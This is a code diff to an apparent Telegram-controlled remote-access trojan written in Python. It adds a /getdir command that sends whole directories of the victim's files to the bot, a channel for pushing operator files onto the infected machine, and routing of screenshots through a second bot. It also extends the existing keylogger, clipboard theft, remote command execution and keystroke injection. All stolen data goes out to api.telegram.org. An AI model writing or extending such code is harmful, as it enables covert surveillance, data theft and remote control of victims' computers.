@@ -17,8 +17,36 @@ from multiprocessing import Pool,Process,Queue,Lock
 from pynput.keyboard import Key, Controller
 from pynput.keyboard import HotKey
 from pynput import keyboard
+from pynput.mouse import Button, Controller as mController
 import pyAesCrypt
-
+class MyProcess(Process):
+    all=[]
+    def __init__(self, group=None, target=None, name=None, args=(), kwargs={},
+                 *, daemon=None):
+        super(MyProcess, self).__init__(target=None,  args=(),kwargs={})
+        self._target=target
+        self._args=args
+        MyProcess.all.append(self)
+        print(len(self.all))
+        
+    def run(self):
+        print('MyProc')
+        if self._target:
+            self._target(*self._args, **self._kwargs)        
+    @classmethod
+    def killAll(cls):
+        print('killall')
+        for prc in cls.all:
+            prc.terminate()
+            print(f'{prc.name} exited')
+            print(len(MyProcess.all))
+        os._exit(0)
+    def terminate(self):
+        print(multiprocessing.current_process().name,' exited')
+        MyProcess.all.remove(self)
+        self._check_closed()
+        self._popen.terminate()
+        
 if os.name=='nt':
     try:
         import win32com.client
@@ -95,6 +123,7 @@ cht=TOKEN=0
 OFFSET=0
 icnt=0
 basestr=""
+SND_BOT_TOKEN=""
 dstr=base64.b64decode(basestr)
 mystr=dstr.decode('ascii')
 keys=mystr.split('\n')
@@ -211,6 +240,14 @@ def copyFile(src,dst):
         logging.debug('Error: %s' % e)
     except IOError as e:
         logging.debug('Error: %s' % e.strerror)
+        
+def moveFile(src,dst):
+    try:
+        shutil.move(src,dst)
+    except shutil.Error as e:
+        logging.debug('Error: %s' % e)
+    except IOError as e:
+        logging.debug('Error: %s' % e.strerror)        
         
 def check_intr():
     try:
@@ -479,8 +516,26 @@ def parseKeys(key,kbd):
         kbd.type(key)
         
         return
-
-        
+def save_file(bot_token,file_path,fname):
+    url=f"https://api.telegram.org/file/bot{bot_token}/{file_path}"
+    print(f"{url=}")
+    with open(fname, 'wb') as handle:
+        response = requests.get(url, stream=True)
+        hdrs=response.headers
+        print(f"Content-Type {hdrs['Content-Type']}")
+        if not response.ok:
+            print("ok")
+        for block in response.iter_content(1024):
+         if not block:
+             break
+         handle.write(block)
+         
+def get_file(bot_token,chtid,file_id):
+    url=f"https://api.telegram.org/bot{bot_token}/getFile"
+    data = {'chat_id' : chtid,'file_id':file_id}
+    r=requests.post(url,params=data)
+    return json.loads(r.text)
+    
 def send_document(bot_token,chtid,docfile,caption='Nothing'):
     url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
     data = {'chat_id' : chtid,'caption': caption}
@@ -555,7 +610,7 @@ def screenshotProc():
 
 def klgProc(klogQueue,TOKEN,cht):
     print("[+]KeyLogger mode activated")
-
+    sendmsg(TOKEN,cht,"[+]KeyLogger mode activated")
     Process(target=keyloggerProc,args=(klogQueue,TOKEN,cht)).start()
     def releaseKey(key):
         klogQueue.put(key)
@@ -625,7 +680,7 @@ def superProc(wt,cht,msg):
                 subprocess.check_output(command, shell=True)                
                 current_time = time.localtime()
                 cur_date=time.strftime('%Y-%m-%d_%H-%M', current_time)        
-                send_photo(wt,cht,"screenshot.png",f"COMPNAME {hostname}_{ip_address} {cur_date} screenshot")
+                send_photo(SND_BOT_TOKEN,cht,"screenshot.png",f"COMPNAME {hostname}_{ip_address} {cur_date} screenshot")
                 time.sleep(3)
         elif msg.startswith("/getfile"):
             msg=msg.split(' ')
@@ -634,6 +689,17 @@ def superProc(wt,cht,msg):
             fname=msg[1]
             if os.path.exists(fname):
                 send_document(wt,cht,fname,f"COMPNAME {hostname} file {fname}")
+        elif msg.startswith("/getdir"):
+            dname=msg[len("/getdir "):]
+            print(dname)
+            if os.path.exists(dname) and os.path.isdir(dname):
+                for name in os.listdir(dname):
+                    fname=f"{dname}\{name}"
+                    print(fname)
+                    if os.path.isfile(fname):
+                        print(fname)
+                        send_document(wt,cht,fname,f"COMPNAME {hostname} file {fname}")
+                        time.sleep(3)
         elif msg.startswith("/getfilelist"):
             print('Yes GetFileList')
             msg=msg.split(' ')
@@ -648,6 +714,7 @@ def superProc(wt,cht,msg):
                             print(fname)
                             fl.write(f"{fname}\n")
                 send_document(wt,cht,"filelist.txt",f"COMPNAME {hostname} file {fname}")
+                time.sleep(3)
             else:
                 print(f"{dirname=} doesn't exist")
         elif msg.startswith("/execute"):
@@ -663,7 +730,8 @@ def superProc(wt,cht,msg):
                 sendmsg(wt,cht,f"Clipboard:{clip}")
     except Exception as ex:
         print(ex)
-        
+   
+   
 def get_keyboard(TOKEN,cht,queuePress,queueRelease): 
     """
         Process recieved key presses from commands 
@@ -686,6 +754,8 @@ def get_keyboard(TOKEN,cht,queuePress,queueRelease):
                     if "+" not in key:
                         keyboardctl.press(eval(key))
                 if key.startswith('<'):
+                    parseKeys(key,keyboardctl)
+                elif "|" in key:
                     parseKeys(key,keyboardctl)
                                 
                         
@@ -713,12 +783,12 @@ def get_keyboard(TOKEN,cht,queuePress,queueRelease):
       
         
 if __name__ == '__main__':
+    multiprocessing.freeze_support()
     res=checkIFRunned(4)
     klgrprc=None
     if res==True:
         sys.exit(1)
-    multiprocessing.freeze_support()
-
+    mctrlr=mController()
 
     
     if os.name!='nt':
@@ -735,15 +805,34 @@ if __name__ == '__main__':
     queue=Queue()
     releaseQueue=Queue()
     klgQueue=Queue()
-    Process(target=get_keyboard,args=(TOKEN,cht,queue,releaseQueue)).start()
-    Process(target=screenshotProc,args=()).start()
+    MyProcess(target=get_keyboard,args=(TOKEN,cht,queue,releaseQueue)).start()
+    #MyProcess(target=screenshotProc,args=()).start()
        
     while True:
-        data=get_updates(OFFSET)
         try:
-            result=data["result"]
+            data=get_updates(OFFSET)
+            result=data["result"]               
             for res in result:
                 OFFSET=res["update_id"]+1
+                try:
+                    if  cht==res["message"]["from"]["id"] and res["message"]["document"]:
+                        fileName=res['message']["document"]['file_name']
+                        fmime=res['message']["document"]['mime_type']
+                        fileId=res['message']["document"]['file_id']
+                        fileSize=res['message']["document"]['file_size']
+                        dirpath=res['message']['caption']
+                        fileres=get_file(TOKEN,cht,fileId)
+                        print(fileres)
+                        filepath=fileres['result']['file_path']
+                        save_file(TOKEN,filepath,fileName)
+                        try:
+                            if os.path.exists(dirpath) and os.path.isdir(dirpath):
+                                moveFile(fileName,f"{dirpath}//{fileName}")
+                        except FileNotFoundError:
+                            print(f"{dirpath} not found")
+                except:
+                    pass
+                    
                 msg=res["message"]["text"]
                 if cht==res["message"]["from"]["id"]:
                     if "°/" in msg:
@@ -756,12 +845,13 @@ if __name__ == '__main__':
                             msg='/'+msg
                         if msg.startswith("/keylogger"):
                             if klgrprc==None:
-                                klgrprc=Process(target=klgProc,args=(klgQueue,TOKEN,cht))
+                                klgrprc=MyProcess(target=klgProc,args=(klgQueue,TOKEN,cht))
                                 klgrprc.start()
                             else:
                                 klgQueue.put("TERMINATE")
                                 klgrprc.terminate()
                                 print("KeyLogger mode was deactivated")
+                                klgrprc=None
                                 sendmsg(TOKEN,cht,"KeyLogger mode was deactivated")
                                 continue
                         if msg.startswith("/start"):
@@ -769,7 +859,7 @@ if __name__ == '__main__':
                             cur_date=time.strftime('%Y-%m-%d_%H-%M', current_time)        
                             sendmsg(TOKEN,cht,f"Hello I'am COMPNAME {hostname}_{ip_address} {cur_date} screenshot")                       
                         if msg.startswith("/getfilelist"):
-                            Process(target=getfilelistProc,args=(TOKEN,cht,msg)).start()
+                            MyProcess(target=getfilelistProc,args=(TOKEN,cht,msg)).start()
                         if msg.startswith("/key"):
                             print("key command")
                             try:
@@ -783,8 +873,12 @@ if __name__ == '__main__':
                                     print('release keys '+keys)                                
                             except ValueError:
                                 print("value error")
-                        if any([ele for ele in ["/screenshot","/getfile","/command","/execute","/clip"] if msg.startswith(ele) ]):
-                            Process(target=superProc,args=(TOKEN,cht,msg)).start()
+                        if any([ele for ele in ["/screenshot","/getfile","/getdir","/command","/execute","/clip"] if msg.startswith(ele) ]):
+                            MyProcess(target=superProc,args=(TOKEN,cht,msg)).start()
             
+        except KeyboardInterrupt:
+            print('mykeyboardinterrupt')
+            MyProcess.killAll()
+            break
         except:
             continue
